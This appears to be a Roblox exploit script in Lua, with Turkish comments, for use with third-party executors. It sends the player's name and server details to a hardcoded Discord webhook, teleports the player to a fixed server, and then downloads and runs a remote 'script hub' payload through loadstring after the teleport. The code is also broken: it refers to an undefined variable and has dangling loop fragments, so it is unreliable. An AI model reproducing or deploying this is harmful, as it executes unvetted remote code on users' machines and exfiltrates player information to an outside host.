-- âœ… Tek sefer Ã§alÄ±ÅŸtÄ±rma kontrolÃ¼
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local plr = Players.LocalPlayer

-- âœ… Webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1407545253342482502/Hf7jtvsT7qFGaD4WIRt-Jg-ObkKUJ3__Vp1xpzZ3sQKUXbaecioGYZopVqii5P1n9iGn"

-- âœ… Fixed PlaceId and JobId
local PLACE_ID = 142823291
local JOB_ID = "4ea7a4f6-1af4-41a4-b9fa-0cdf7b0e4556"

-- âœ… Universal request (executor uyumlu)
local req = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
if not req then warn("Request function bulunamadi!") return end

-- ðŸ”¹ Debug mesajÄ±
req({
    Url = WEBHOOK_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode({content = "ðŸ¤– Bot baÅŸlatÄ±ldÄ±, fixed server'a teleport ediliyor..."})
})

-- ðŸ”¹ Teleport ve webhook iÅŸlemi
spawn(function()
    local joinLink = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", PLACE_ID, JOB_ID)
    local robloxCode = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", PLACE_ID, JOB_ID)
            
    -- Webhook payload
    local payload = {
        content = robloxCode,
        embeds = {{
            title = "ðŸ”— Tap to Join",
            description = string.format("[Join Server Here](%s)\n**Player:** %s\n**PlaceId:** %s\n**ServerId:** %s", joinLink, plr.Name, PLACE_ID, JOB_ID),
            color = 5814783
        }}
    }
            
    req({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })

                -- ðŸš€ Teleport
        TeleportService:TeleportToPlaceInstance(PLACE_ID, jobId, plr)
            
    -- ðŸ”¹ Teleport sonrasÄ± pastefy script
    queue_on_teleport([[
        task.spawn(function()
            print("âœ… Teleport sonrasÄ± kod inject oldu, pastefy script yÃ¼kleniyor...")
            loadstring(game:HttpGet('https://raw.githubusercontent.com/mm2scripthub/TravHub/refs/heads/main/MurderMystery2'))()
        end)
    ]])
            
            break
        else
            print("Bot: Uygun server bulunamadÄ±, 1 saniye sonra tekrar denenecek...")
        end
        wait(1)
    end
end)
